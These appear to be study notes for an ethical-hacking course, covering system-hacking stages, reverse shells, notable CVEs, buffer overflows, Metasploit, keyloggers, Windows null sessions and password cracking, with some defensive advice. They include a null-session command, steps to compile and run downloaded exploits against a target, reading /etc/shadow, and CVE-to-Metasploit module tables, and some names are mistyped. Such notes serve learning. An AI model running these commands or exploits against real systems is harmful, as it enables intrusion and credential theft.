### 6.1 SYSTEM HACKING CONCEPTS

- System hacking is an attempt to break into a computer system that you normally have no (or limited) access to
- The goals of system hacking are typically to:
	- Access confidential data or restricted services
	- Obtain a password or credential that can be used elsewhere
	- Use the system as a “stepping stone” for further attacks into the network
	- Disrupt the system’s functionality

#### SYSTEM HACKING STAGES

| #ID | Stage               | Description                                                                                                                         |
| --- | ------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Gain Access         | - Password cracking<br>- OS vulnerability<br>- Service and application vulnerabilities<br>- Social Engineering<br>- Physical Access |
| 2   | ESCALATE PRIVILEGE  | - Kernel or service flaws<br>- Social Engineering                                                                                   |
| 3   | EXECUTE APPLICATION | - Pivot<br>- Plant RATs<br>- Run payloads<br>- Exfiltrate data                                                                      |
| 4   | Hide files          | - Leave malicious files on system<br>- Steganography<br>- Alternative Data Streams                                                  |
| 5   | Cover tracks        | - Remove artifacts<br>- Clear Logs and history                                                                                      |

#### EXPLOITS and PAYLOADS
- An exploits takes advantages of a weakness
	- It gets you into the system
- A payload is the code that is executed through the exploit 
	- It does the real damage
	

#### BIND SHELL PAYLOAD
- The attacker sends an exploit to the victim
- The payload opens a listening back door on the victim machine
- The attacker then connects to that back door
	- The attacker must be able to get past the victim's firewall to connect to the back door
> Victim's port is used as back door
#### REVERSE SHELL PAYLOAD
- The attacker sends an exploit to the victim
- The payload makes a client connection from the victim's machine back to the attacker
	- The victim is making an outbound connection past their firewall
	- the attacker need to contend with the victim's firewall to use the connection
- The attacker must be prepared with a handler that listens for incoming connections
	- The attacker's firewall must permit a connection to the incoming port
> Attacker's port is used for reverse connection

#### EXPLOIT CHAINING
- Exploit chaining is the act of using multiple exploits to form a larger attack
- Success may depend on all exploits doing their part
- Distributed nature makes them complex and difficult to defend against
- Some chained exploits must run consecutively
- Some run in parallel
-Examples
1. Social Engineering -> Standard user account - >> MS_17_010 Eternal Blue Attack ->> Administrator prompt ->> PWN!
2. Malicious Adobe PDF ->> VNC injection --> UAC kitrap0d local Priviledge Esc ->> Administrator prompt ->> PWN!
3. Distract a Guard ->> Tamper with Alarm System ->> Break into Office ->> Plant Kali Raspberry PI in network ->> Use PI to launch internal attacks ->> PWN!

#### HIGHEST PROFILE SYSTEM VULNERABILITIES EXPLOITED IN 2022
- ProxyLogon  #python 
	- CVE-2021-26855
	- Affects Microsoft Exchange 2013, 2016, 2019
	- An attackers can bypass authentication and impersonate an administrator
- ZeroLogon
	- CVE-2020-1472
	- Cryptographic flaw in the login process
	- Initialization Vector (IV) is set to all zeros all the time
		- Should always be a non-zero random number
	- An attacker can connect to the Active Directory netlogon remote protocol (MS-NRPC) and log on as computer account with no password
	- The attacker can them dump user account hashes or perform some other action
- Log4Shell
	- CVE-2021-44228
	- Affects the popular and widely used Apache Java logging library Log4j
	- Remote code execution
	- An attackers inserts a JNDI query to a malicious LDAP server
	- The logging utility executes the query, downloading and running malicious payloads on the server side
- VMWare vSphere Client
	- CVE-2021-21972
	- A remote code execution vulnerability in the VMWare vSphere client (HTMLs)
	- CVSS 9.8
	- An attacker can escalate privilege's and execute remote commands on ports 443
	- The machine can then be used as a springboard to access the entire infrastracture
- Petit_Potam
	- CVE-2021-36942
	- Targets Windows Servers
	- Active Directory Certificates Services (AD CS) are not configured with protection against NTLM relay attacks
	- An Attacker can force a domain controller

### 6.2 COMMON OPERATING SYSTEMS EXPLOITS
- Windows, Linux, IOS and many applications are written in some variant of the C programming language
- C Language vulnerabilities includes
	- No Defaults bounds-checking
	- Susceptible to buffer overflows, arbitrary code execution, and privilege escalation
	- Developers often do not incorporates security best practices and unit-testing
- Operating systems come bundled with many features, utilities and code libraries and services that can have their own vulnerabilities
- Installed applications can also add vulnerabilities to the OS
- Missing or Improper file system permissions
	- E.g. FTP servers allows anonymous authentication, along with write and delete file system privileges on its defaults directory

#### Common Operating System Exploit Categories

| #ID | Category                | Description                                                                                                                  |
| --- | ----------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| 1   | Remote code execution   | Any condition that allows attackers to execute arbitrary code                                                                |
| 2   | Buffer or heap overflow | A programmer error that allows attackers to overwrite allocated memory addresses with malicious code                         |
| 3   | Denial of Service       | Any Condition that allows attackers to use resources so that legitimate request can't be served                              |
| 4   | Memory Corruption       | A programming error that allows attackers to access a program's memory space and hijack the normal execution flow            |
| 5   | Privilege escalation    | Any condition that allows attackers to gain elevated access to a compromised system. Often performed through kernel exploits |
| 6   | Information disclosure  | Any condition that allows attackers to gain access to protected information                                                  |
| 7   | Security Feature bypass | A Software weakness that allows attackers to circumvent policies, filters, input validations, or other security safeguards   |
| 8   | Directory Traversal     | Any condition that allows attackers to access restricted areas of a file system                                              |
#### RING of PRIVILEGE
- Intel CPU Architecture
- Started with i386
- Hardware enforce privilege levels and process separation
	- Kernel in center and Outermost layer 'Ring 3' is least privileged while Nearest near kernel 'Ring 0' will be most privileged

#### KERNEL EXPLOITATION
- The kernel is the core part of the windows or Linux operating System
- It manages memory, schedules processing threads , and manages device I/O.
- It Runs in Rung 0 and has priority over all other processes
- Exploits that attack the kernel escalate privileges and destabilize the entire system.

#### KERNEL EXPLOIT SUGGESTERS
- Kernel exploit suggesters exist for both Windows and Linux
- Watson (windows)
	- A .Net tool designed to enumerate missing KBs and suggest exploits for Privilege escalation vulnerabilities
	- https://github.com/rasta-mouse/watson
- Linux Exploit Suggester
	- Designed to assist in detecting security deficicencies for given Linux kernel / Linux based machine.
	- https://github.com/mzet-/linux-exploit-suggestor

#### RECENT WINDOWS KERNEL EXPLOITS
- CVE-2019-0836 LUAFV POSTLuafvPostReadWrite SECTION_OBJECT_POINTERS Race condition Windows 10 1809
- CVE-2019-0841 Microsoft Window 10 < build 17763 - AppxSvc Hard link Privilege Escalation
- CVE-2020-0796 SMBGhost (Windows 10 1903/1909) Remote Code Execution
- CVE 2019-1458 Wizard Opium (Windows) Local Privilege Escalation
- CVE 2019-1125 Windows Kernel Information Disclosure
- CVS-2019-0708 Windows 7 (x86) - 'Bluekeep' Remote Desktop Protocol (RDP) Remote Windows Kernel Use After Free

#### RECENT LINUX KERNET EXPLOITS
- CVE-2022-0847 Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)
- CVE-2020-12352, 12351 Linux Kernel 5.4 - BleedingTooth Bluetooth Zero-Click Remote Code Execution
- CVE-2019-13272 Linux Kernel 5.1x - 'PRTRACE_TRACEME' pkexec local privilege Escalation
- CVE-2019-19241 Linux 5.3- Privilege Escalation via io_using Offload of sendmsg() onto kernel Thread with Kernel creds.

> Many more are available on https://www.exploit-db.com

#### SPECTRE and MELTDOWN
- Catastrophic Kernel exploits
	- CVE - 2017-5755, CVE-2017-5753, CVE 2017-5754
	- Impacts over 2800 vulnerable CPU types (Intel, IBM Power PC , AMD , ARM)
- They break a fundamental assumption in operating system security
- That an application running in user space cannot kernel memory
- Meltdown causes out-of-order execution on the CPU
	- Can leak kernel memory into user mode long enough for it to be captured by a side-channel cache attack
- SPECTRE
	- Causes a CPU to speculatively execute a malicious code's path
	- The malicious path is rolled back but metadata is left in a cache that could also be captured by a side-channel attack
- In the cloud, an application in one VM could access the memory of another VM 
	- An attacker could rent an instance on a public cloud
	- Collect information from other virtual machines on the same server.


### 6.3 BUFFER OVERFLOWS

#### WHAT IS A BUFFER?
A temporary storage area in RAM , which is allocated to an application for its in/out functions.

#### WHAT IS BUFFER OVERFLOW?
- A condition when incoming data exceeds the size of the app's buffer
- Buffer are create to contain a finite amount of data
- Extra information can cause an overflow into a adjacent buffers, corrupting or overwriting the valid data held in them

#### HOW A BUFFER OVERFLOW WORKS
- In a buffer overflow, a functions return address is overwritten with a new pointer to malicious code (usually shellcode)
- When an application starts, it loads its code into memory
- If some function of the app takes input, it will temporarily store that input into its buffer
	- An area of memory designated for this purpose
	- The app uses its as a workspace
- If the developer who created the app does not include bounds checking or other input limits on that function, it is vulnerable to an overflow
	- An attackers can enter so much excess data that the buffer overflows
	- Malicious code spills into and takes over surrounding memory addresses
- When an app's function is called upon to do something
	- It reads and act upon input in the buffer
	- When it is done it returns back to the address of the calling function
	- I did what you asked, now back to you
- If the return address has been overwritten with malicious pointer, instead of returning back to the original function, it executes the malicious code.

#### BUFFER OVERFLOW EXAMPLE

- Normal code (including return address ) is overwritten by malicious code
- When the called functions is done (returns to the calling function) it does not go back to the normal function but instead goes to malicious functions
```
char buff[10] = {0};
strcpy(buff, "This string will overflow the buffer");

```

#### WHAT MAKES an application/service Vulnerable to a buffer overflow

- When the developers does not include input limits (bound checking) on a function that accepts incoming data
- Programming languages tha are MOST vulnerable to buffer overflows are those that stem from the C programming language including
	- c, c++, Objective-C
- Programming langugage that have build-in bounds checking include
	- Java, python, C#

#### BUFFER OVERFLOW EXPLOIT
- The gold standard of system attacks
- A service or application does not validate a variable's size before allowing the information to be written into memory
- It won't stop input that overflows its buffer
- The attack overflow the app's buffer and overwrites adjacent memory locations with malicious code (usually shellcode to give the attacker an interactive environment)
- As a result, malicious input might be written to surrounding memory addresses. Executed in the privilege level of process it overflow (hopefully SYSTEM)
- The original function, having lost its working space, becomes unstable.

#### HOW TO DEFEND AGAINST BUFFER OVERFLOWS
- The application developer must include bounds checking on any function that accepts input
- You can "Fuzz test" an application (send it excessive random data) to see if it is vulnerable (will react in unexpected ways)
- Keep OS and application patches up-to-date
- if you are the developer, use secure coding practices to prevent overflows

#### SECNARIO

- You are examining a security report that includes the following statement:
	- After breaching a system, the attackers entered some unrecognized commands with very long text strings and then began using the sudo command to carry out actions.
	- What do you think the attacker was doing?
	- Buffer overflow
	- The key point in the report is that the attacker was entering unrecognized commands with very long text strings
	- The attackers seems to have been inputting more than the application could handle

### 6.4 SYSTEM HACKING TOOLS AND FRAMEWORKS
- PsTools : https://docs.microsoft.com/en-us/sysinternals/downloads/pstools
	- PsExec : execute processes remotely
	- PSFile : shows files opened remotely
	- PsGetSid : displays the SID of a computer or a user
	- PsInfo : list information about a system
	- PsPing : Measure network performance
	- PsKill : - kill processes by name or process ID
	- PsList - list detailed information about processes
	- PsLoggedOn - See who's logged on locally and via resource sharing (full source is included)
	- PsLogList - dump event log records
	- PsPasswd : - change account passwords
	- PsServer - view and control services
	- PsShutdown - shuts down and optionally reboots a computer
	- PsSuspend - suspends processes
	- PsUpTime - shows you how long a system has been running since its last reboot
		- PsUptime's functionality has been incorporated into PsInfo
- Kali Linux
	- Metasploit
	- SearchSploit : 
		- Ships with Gnome-based kali linux. Can also be installed to run on Linux, macOS, Windows
		- Local copy of the entire exploit-db.com database
		- Update your local copy of the database
			- Searchsploit -u
			`cd /usr/share/exploitdb/exploits` 
			search exploit (return in c, python, ruby, perl, etc). but some exploit are available in source code format , so  those need to be compiled into an executable . 
			Download source code, read the source , and find info from exploit-db.com or google , how to use it. Some exploit to compile or execute need additional library , install those as pre-requisites.
			`gcc -o myexploit ./coolsploit.c `
			`g++ -o mybestsploit ./verycool.cpp`
		To run exploits we may require to give permissions 
		`chmod 777 ./pwn.py'
		`chmod 777 ./mysploit`
		Execute the exploit program
		`python ./pwn.py targetHostIP`
		`./mysploit targetHostIP`
		
'exploits are written in '
	- Other Tools
- exploit-db.com / searchsploit
- GitHub.com
- www.exploitalert.com
- Packetstormsecurity.com
- Google


### 6.5 METASPLOIT

> need to update [[Metasploit]]

#### METERPRETER
- The "Gold Standard" of Metasploit payloads
	- Prefer to use when possible if you want an interactive shell
	- Might not be payload choice for some exploits
	- Might not be stable for some targets - in this case choose a shell instead
- Provide a "post exploit" interactive shell with over 100 available commands
- Type ? at the Meterpreter prompt to see all commands with description
-
#### Meterpreter Command Categories
- Core commands
- File system commands
- Networking commands
- System commands
- User interface commands
- WebCam commands
- Audio output commands
- Elevate commands
- Password database commands
- Timestamp commands (manipulate file timestamps)
- 



### 6.7 KEYLOGGING AND SPYWARE
- Record keys storkes of individual computer keyboard or a network of computers
- Can be used along with spyware to transmit what you type to a third party

##### KYELOGGER TYPES
- Hardware-based
	- inserted between keyboard and computer (Example : KeyCarbon, KeyLlama, Keyboard Logger, KeyGhost, KeyCobra, KeyKacther)
- PC/BIOS Embedded
- Keyboard Keylogger
- External Keylogger
	- PS/2 and USB adapters
	- Acoustics / CAM keylogger
	- Bluetooth keylogger
	- Wi-Fi Keylogger
- Kernel / RootKit / Device Driver
- Hypervisor-based
- Form Grabbing-based
- Software KeyLogger : 
	- Metasplit Payload module, 
	- All in one keylogger, 
	- Free keylogger,
	- spyrix personal monitor, 
	- SoftActivity Activity monitor
	- Keylogger spy monitor
	- Micro keylogger
	- REFOG keylogger
	- Realtime-spy
	- StaffCop Standard

#### HOW TO DEFEND AGAINST KEYLOGGERS
- Use popup blockers and avoid opening junk email
- Install anti-spyware / anti-virus program , keep updated
- Install software firewall and anti-keylogging software
- Recognize phishing emails
- Update and patch regularly
- Install a host-based IDS
- Use a password manager
- Restrict physical access to sensitive computers
- Visually inspect computers periodically

##### ANTI-KEYLOGGERs
- Zemana Antilogger
- GuardedID
- KeyScrambler
- SpyShelter Free Anti-keylogger
- DefenseWall HIPS
- Elite Anti Keylogger

##### SPYWARE
- Watches and logs a user's action without the user's knowledge
- Hide its process, files and other objects
- Might redirect the user or browser, present malicious popups
- Stores its activity log locally or in a central location

##### SPYWARE ACTIVITIES
- Steal passwords
- Log keystrokes
- Location tracking
- Record desktop activity
- Monitor email
- Audio/Video surveillance
- Record/monitor Internet activity
- Record software usage/timings
- Change browser settings
- Change firewall settings

##### Popular SPYWARE
- Agent Tesla
- AzorUlt
- TrickBot
- Gator
- Pegasus
	- Zero-Click Spyware- victim need not click anything to become infected
	- Can be delivered via infected app installers
	- The most powerfull spyware created to date by a private company
	- Developed by the Israeli cyber-arms comapany NSO Group
		- A lawful intercept vendor
	- Sold to goverments
	- Can be covertly installed on mobile phones (and other devices) running most versions of IOS and Android
	- Pegasus can be installed on a phone through vulnerabilites in common apps, or by tricking a target into clicking a malicious link
	- Once installed, Pegasus can theoritically harvest anydata from the device and transmit back to the attacker.
- Vidar
- DarkHotel
- Zlob
- FlexiSpy
- Cocospy
- Mobistealth

#### HOW TO DEFEND AGAINST SPYWARE
- Avoid using systems not fully under your control
- Don't open suspicious emails or file attachments
- Enable a software firewall
- Patch, update, an virus scan regularly
- Do not use a priviledge /administrator account for ordinary tasks
- Do not download free music files, screensavers, games, etc.
- Beware of popup windows
- Avoid using free public Wi-Fi services.
- Always have a backup of the important data stored in your devices

##### ANTI-SPYWARE TOOLS
TOTALAV 
SCANGUARD
PCPROTECT
BITDEFENDER
NORTON
AVG
AVAST
McAfee
MalwareBytes
BullGuard
Kaspersky
ESET
Panda
TREND Micro
F-Secure
ZoneAlarm



### 6.8 NETCAT

Document @ [[NETCAT]]

### 6.9 Hacking Windows

#### LOCAL USER ACCOUNTS
- Every Windows computer has local user accounts
	- The username and password is for that computer only
- Local user credentials are stored in %systemroot%\System32\config\SAM
	- On every Windows computer
- Each account has a unique Security Identifier (SID)
	- 128 bit number that does not change, even if the account is renamed
	- It distinguishes accounts that have the same name on different computers
	- The last part of the SID is called the “Relative ID” (RID)
	- User accounts start with a RID of 1000
		- The number increments by one for each new user
	- The RID is locally unique, and is never reused on that computer

#### LOCAL ADMINSTRATOR ACCOUNT
- The administrator account has a RID of 500
- The administrator can be renamed, but the RID never changes
- The administrator account cannot ever be locked out, regardless of password policy
	- Other members of the administrators group ARE subject to password lockout
- The administrator account is typically disabled by default on client machines
- 3 Ways to enable the administrator account:

```
\\[1] Command prompt: 
net user "Administrator" /active:yes

\\[2] PowerShell: 
Get-LocalUser -Name "Administrator" | Enable-LocalUser

```
	-[3] Local Users and Groups: Right-click administrator  Properties  uncheck Account is disabled

#### TOOLS to Administer Local User Accunts
- Control Panel\Administrative Tools\Computer Management\Local Users and Groups
	- Computer Management app (compmgmt.msc) can also be launched directly
- Settings\Accounts
- Command prompt net user command
- PowerShell cmdlets:
	- Get-LocalUser
	- New-LocalUser
	- Set-LocalUser
	- Enable-LocalUser
	- Disable-LocalUser
	- Rename-LocalUser
	- Remove-LocalUser

#  Local Windows Groups
- Local Windows groups are also stored in the SAM
- Attackers are most interested in the local administrators group
- You can use many of the same tools to administer both users and groups
- Net localgroup command
- PowerShell cmdlets
	- Get-LocalGroup
	- Get-LocalGroupMember
	- Add-LocalGroupMember

#### WINDOWS NULL SESSION
 - Originally used by Windows computers to trade Network Neighborhood browse lists (lists of computers on the network)
- Machines would connect to each other’s IPC$ share with no username and no password
- Hackers discovered how to manually create a null session and enumerate information - including system information, users, groups and shares
- The original command was:
```
net use \\target\ipc$ "" /u: ""
```
- IPC$ is a hidden share
	- It’s a process, not a directory
	- Inter-process communication
- The null session was one of Windows’ most debilitating vulnerabilities
- Null sessions can be established through ports 135, 139, and 445
- Now disabled by default, but can still be enabled manually or through group policy

#### ENABLE NULL SESSIONS VIA GROUP POLICY
 Null sessions are disabled by default, but can still be enabled in Group Policy
- Open the Group Policy Editor
- Navigate to:
	- Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options
- Disable the following settings:
	- Network access: Restrict Anonymous access to Named Pipes and Shares
	- Network access: Do not allow anonymous enumeration of SAM accounts
	- Network access: Do not allow anonymous enumeration of SAM accounts and shares
	- Network access: Shares that can be accessed anonymously
- Enable the following settings:
	- Network access: Let Everyone permissions apply to anonymous users
	- Network access: Allow anonymous SID/Name translation

#### MOST EXPLOITED WINDOWS VULNERABILITIES

| Feature               | Description                                                                                                                                                                         | Exploits                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| LSA                   | "PetitPotal" windows local security Authority (LSA) spoofing vulnerability CVE-2021-36942, CVSS 5.3                                                                                 | - Metasploit petitpotam<br>- GitHub (6) repos                                                                                        |
| MS Exchange 2013-2019 | "ProxyLogin" MS Exchance Server RCE Vuln                                                                                                                                            | - Meta exchange proxylogon_rece<br>- Github (57) repos                                                                               |
| Print Spooler         | PrintNightmare, Windows print spooler RCE vulnerablity CVE-2021-1675 CVSS 8.8                                                                                                       | - Meta cve_2021_1675_printnightmare<br>- github (70) exploits                                                                        |
| DCERPC Netlogon       | ZeroLogon, NetLogon Priviledge Escalation Vuln CVE-2020-1472, CVSS 8.8                                                                                                              | - Meta CVE_2020_1472_zerologon<br>- Github (54) repos                                                                                |
| SMBv1                 | External Blue Windows SMB REmote Code Execution Vulnerability CVSS 8.1<br>CVE_2017-0143, CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, CVE-2017-0148, MS17-010                       | Metasploit<br>ms17_010_externalblue,<br>ms17_010_psexec, etc.                                                                        |
| Print Spooler         | • Microsoft Spooler Local Privilege Elevation Vuln<br>• CVE-2020-1048                                                                                                               | • Meta cve_2020_1048_printerdemon<br>• GitHub (2) exploit repos                                                                      |
| Internet<br>Explorer  | • Scripting Engine Memory Corruption Vuln<br>• CVE-2018-8373                                                                                                                        | • Exploit-DB/exploits/42995                                                                                                          |
| VBScript<br>Engine    | • Windows VBScript Engine RCE Vuln<br>• CVE-2018-8174                                                                                                                               | • GitHub CVE-2018-8174-msf<br>• Exploit-DB/exploits/44741                                                                            |
| Windows               | • Windows Persistent Service Installer<br>• No CVE (2018)                                                                                                                           | • Metasploit local/persistence_service                                                                                               |
| Internet<br>Explorer  | • MS Browser Memory Corruption RCE Vuln<br>• CVE-2017-8750                                                                                                                          | • GitHub bhdresh/CVE-2017-8759                                                                                                       |
| DCOM/RPC<br>          | • Net-NTLMv2 Reflection DCOM/RPC (Juicy)<br>• CVE-2016-3225, MS16-075                                                                                                               | • Metasploit ms16_075_reflection_juicy                                                                                               |
| VBScript<br>Engine    | • IE 11 VBScript Engine Memory Corruption<br>• CVE-2016-0189, MS16-051                                                                                                              | • Metasploit ms16_051_vbscript<br>• GitHub theori-io/cve-2016-0189                                                                   |
| WebDav                | • mrxdav.sys WebDav Local Privilege Escalation<br>• CVE-2016-0051, MS16-016                                                                                                         | • Metasploit ms16_016_webdav                                                                                                         |
| Windows<br>Shell      | • DLL Planting RCE Vulnerability<br>• CVE-2015-0096, MS15-020                                                                                                                       | •ms15_020_shortcut_icon_dllloader                                                                                                    |
| Task<br>Scheduler     | • Windows Escalate Task Scheduler XML<br>Privilege Escalation, CVE-2010-3338, MS10-092                                                                                              | • Metasploit ms10_092_schelevator                                                                                                    |
| Print<br>Spooler      | •<br> Print Spooler Service Impersonation<br>Vulnerability<br>•<br> CVE-2010-2729, MS10-061                                                                                         | • ms10_061_spools                                                                                                                    |
| Windows<br>Shell      | • Microsoft Windows Shell LNK Code Execution<br>• CVE-2010-2568, MS10-046                                                                                                           | • s10_046_shortcut_icon_dllloader                                                                                                    |
| SYSTEM                | • Windows SYSTEM Escalation via KiTrap0D<br>• CVE-2010-0232, MS10-015                                                                                                               | • Metasploit ms10_015_kitrap0d                                                                                                       |
| UAC                   | • Windows Escalate UAC Protection Bypass<br>• No CVE (2010)                                                                                                                         | • Metasploit local/bypassuac                                                                                                         |
| IIS 5.0               | • “IIS Unicode Directory Traversal”<br>• IIS Unicode Requests to WebDAV Multiple<br>Authentication Bypass Vulnerabilities<br>• CVE-2009-1122, MS09-020<br>• First exploited in 2000 | <br>Unicode characters in IE 5 URI,<br>HTML-based email messages, other<br>browsers from that time period<br>Code Red II/NIMDA worms |
| SMB                   | •<br> Server Svc Relative Path Stack Corruption Vuln<br>•<br> CVE-2008-4250, MS08-067                                                                                               | •Metasploit ms08_067_netapi<br>• Conficker worm                                                                                      |
| SMB                   | • Windows SMB Relay Code Execution<br>• CVE-2008-4037, MS08-068                                                                                                                     | smb_relay, smb_delivery                                                                                                              |
| RPC                   | • MS03-026 Microsoft RPC DCOM Interface<br>Overflow, CVE-2003-0352                                                                                                                  | • Metasploit ms03_026_dcom                                                                                                           |
| IIS 5.0<br>WebDAV     | • MS IIS 5.0 WebDAV ntdll.dll Path Overflow<br>• CVE-2003-0109, MS03-007                                                                                                            | • Meta ms03_007_ntdll_webdav<br>• Exploit-DB 16470                                                                                   |
| Windows               | • Windows Unquoted Service Path Privilege Escalation<br>(2001)<br>• No CVE                                                                                                          | Metasploit unquoted_service_path                                                                                                     |
| Null Sessions         | • NETBIOS/SMB share password is the default, null, or<br>missing<br>• Allows anonymous connections to the IPC$ share<br>• CVE 1999-0519                                             | Enum4Linux, getacct.exe<br>WinScanX, winfigerprint-x<br>smb-enum-users.nse<br>smb-enum-shares.nse                                    |
| Powershell            | • PowerShell Remoting RCE, CVE-1999-0504                                                                                                                                            | Metasploit powershell_remoting                                                                                                       |
| Powershell            | • Windows Command Shell Upgrade (Powershell)<br>• No CVE (1999)                                                                                                                     | •Metasploit<br>powershell_cmd_upgrade                                                                                                |
|                       |                                                                                                                                                                                     |                                                                                                                                      |

#### WINDOWS APPLICATION ATTACK EXAMPLES


| Feature                    | Desciption                                                                                   | Exploits                                                             |
| -------------------------- | -------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- |
| Adobe Flash Player         | Adove Flash player (pre-28.0.0.161)<br>- CVE-2018-4878                                       | - github/syfi/cve-2018-4878<br>- github/B0fH/CVE-2018-4878           |
| MS Office (including 0360) | Microsoft Office Memory corruption Vulnerability<br>- CVE-207-11882<br>-Not rated            | - QuasarRAT trojan<br>- Andromedia botnet<br>- Github/CVE-2017-11882 |
| MS Office / wordpad        | Microsoft office/wordpad remote code execution vulnerability w/Window API<br>- CVE-2017-0199 | - Github/bhdresh/CVE-2017-0199<br>- Exploit-DB/exploits/42995        |
| MS Office                  | - MSCOMCTL.OCX Buffer overflow                                                               | Exploit-DB/Exploits/18780<br>Metasploit:ms12_027_mscomctl_bof        |
|                            | - Not rated                                                                                  |                                                                      |


### 6.10 HACKING LINUX
 - In addition to the over 600 existing Linux distributions, many commercial - products are based on Linux
- Most exploits target specific products that are Linux-based, or services installed in Linux distros
- Metasploit has the following exploit modules with a rank of great or excellent:
	- 68 against Linux specifically
	- Over 400 against apps and services that run on Linux
- Github lists (546) repos related to Linux exploits
- Linux-based apps/products with the most Metasploit exploit modules:
	- Apache
	- Adobe Flash Player
	- Java
	- ProFTPD
	- VMware

#### LINUX USERS
- User accounts are listed in /etc/passwd
	- Anyone can read
	- Rot and Service accounts will be listed first
	- people accounts will be at the bottom of the list
	- `cat /etc/passwd`
- Passwords are stored in /etc/shadow
	- Passwords are salted and hashed
	- Only accessible by root user
	- `sudo cat /etc/shadow`

> Shadow FILE contains OS user passwords in hashed format

```
mux:$1 $fnfffc $pGteyHdic :15164: 0: 9999: 7 :::
1  : 2                    : 3   : 4: 5   : 6 
---
---

\\ 1 : A valid account name on the system
\\ 2 : Hashed password (format is $1d$salt$hasehed)
\\ 3 : date of last password change
\\ 4 : Minimum password age in days (empty or 0 = no minimum)
\\ 5 : Maxmimum password age in days
\\ 6 : User warning days until password expiration
```


#### USERS IDS in Linux
- Root has UID and GID of 0
	- you can see this information by issuing the command id. root#kaliL~#id
	- uid=0(root) git=0(root) groups= 0 (root)
- In most linux systems non-root/normal user IDs start at 1000
	- In fedora and centos they start at 500

####  Top Linux Threats 2022
	- Coinminers (24.56%)
	- WebShells (19.92%)
	- Ransomeware (11.55%)
	- Trojans (9.65%)
	- Others (3.15%)


#### MOST COMMON Linux Vulnerabilties

| Vulnerability                                                        | CVE            | CVSS             |
| -------------------------------------------------------------------- | -------------- | ---------------- |
| DirtyCred use-after-free kernel vulnerability                        | CVE-2022-2602  | Not yet assgined |
| DirtyPipe Local kernel priviledge escalation flaw                    | CVE-2022-0847  | 7.8              |
| Linux kernel slab out of bounds write vulnerability                  | CVE-2021-42008 | 7.8              |
| bypass authenticatio nin alibaba nacos AuthFilter                    | CVE-2021-29441 | 9.8              |
| RCE Vulnerability in wordpress file manager plugin (wp-file-manager) | CVE-2020-25213 | 10               |
| RCE vulnerability in vBulleting 'subwidgetConfig'                    | CVE-2020-17496 | 9.8              |
| Oracle Weblogic Server RCE vulnerability                             | CVE-2020-14750 | 9.8              |
| Atlassian Jira disclosure                                            | CVE-2020-14179 | 5.3              |
| saltstack salt authorization vulnerability                           | CVE-2020-11651 | 9.8              |
| Liferay portal untrusted Deserialization vulnerability               | CVE-2020-7961  | 9.8              |
| RCE vulerability in Apache strut 2                                   | CVE-2019-0230  | 9.8              |
| RCE vulnerability in Apache struts OGNL                              | CVE-2018-11776 | 8.1              |
| RCE vulnerability in Drupal Core                                     | CVE-2018-7600  | 9.8              |
| RCE vulnerability in Apache struts OGNL                              | CVE-2017-12611 | 9.8              |
| REST plugin vulerability for Apache struts 2, Xstream RCE            | CVE-2017-9805  | 9.1              |
| Integer Overflow in Eclipse Jetty                                    | CVE-2017-7657  | 9.8              |
| Remote code Execution (RCE) vulnerability in APACHE struts 2         | CVE-2017-5638  | 10               |

#### 6.11 PASSWORD ATTACKS
#### Where passwords are stored
- Windows Security Accounts Manager (SAM)
	- `C:\windows/system32\config`
	- Prior to window 10 the SAM was encrypted by SYSKEY (128-bit RC4 encryption)
	- Since Window 10, Bitlocker disk encryption encrypts the SAM
- Active Directory (ntds.dit)
	- `C:\Windows\NTDS`
- Linux shadow file
	- `/etc/shadow`
	- Contains password hashes only
	- Requires /etc/passwd file to provide associated usernames
	- You can use John-the-Ripper to combine (unshadow) the two files before cracking
- Config Files for apps and services
	- If they do not use the operating system for authenticating users


#### PASSWORD STRENGTH
- Determined by length and complexity
- Complexity is defined by number or character set used
	- lower case, upper case, number symbols etc
- Short password (e.g 4-digit pin) can be brute force in a few seconds
- Each additional character adds orders of magnitude to cracking time
- Check how long it would take to crack a pasword
https://www.security.org/how-secure-is-my-password

#### PASSWORD HASHES
- Passwords are usually not stored in clear text
- They are most likely stored in a hashed format
- Hashes are one-way cryptographic functions that are not meant to be decrypted
- To crack password hashes:
	- Obtain the password hashes
	- Determine the hashing algorithm
	- Hash each password you wish to try using the same  algorithm
	- Compare your result to the stored hash
	- If they are the same you found the password


#### SALTING THE HASH
- A salt is additional random data added to a user's password before it is hashed
- It lengthens the password, making it harder to crack
- Salts should be unique to each user, and never reused

#### PASSWORD ATTACK TYPES
- Active online attacks
	- Dictionary
	- Brute forcing
	- Password spraying
	- Hashdump
	- Keylogging
	- MITM
- Passive online attacks
	- Sniffing
- Offline attacks
	- Many online cracking tools can also work for offline cracking
	- Grab a copy of the password database /file and start cracking
- Physical access attack
	- Boot the system from a USB stick or CD
	- Use a tool such as CHNTPW to overwrite the area of disk that stores passwords
- Non-electronoic attacks
	- Social engineering - most effective
	- Dumpster diving
	- Snooping around
	- Guessing
	- Rubber host (coercion)

#### PASS THE HASH
A network based attack
The attacker steals the hashed user credentials
Instead of providing the password the hash is provided
Instead of providing the password, the hash is provided
You can use a hash dumper to retrieve hashes from a system's memory
Might not always work with use of windows defender Credentials Guard, Registry settings for UAC

#### PASSWORD CRACKING CONSIDERATIONS
- can be very slow and CPU intensive
- Consider using a dedicated processing units (GPU) to offload the work
	- Dedicated GPU's are designed to conduct complex mathematical functions extremely quickly
- Using a rainbow table (dictionary of pre-computed hashes) can dramatically speed up password cracking
- Dictionaries and rainbow tables can be very large in size
- You can also upload the hash to an online service
	- Some are free
	- Some charge a fee
- Cracking passwords, hashes, and encryption is a lot like mining cryptocurrency in that using dedicated GPUs will give the best performance



#### Dictionary ATTACK
- An attack in which a password cracking tool goes through a list of words (dictionary until it either )
	- finds the password or exhaust the list
- The hope is that a large enough dictionary contains the password because users choose easy passwords
- Researchers have spent years collating wordlists
- Practical limitations
	- Must know user name, though user names can also be in wordlists
	- Lists can become unwieldy in their size (1.5 billion words = 15 GB uncompressed)
	- Lockout policies could significantly slow you down or lock the account
- can be online or offline

#### Methods to Perform a Dictionary attack
- Steal copy of file or database containing credentials (offline cracking)
- Induce system to dump hashes passwords
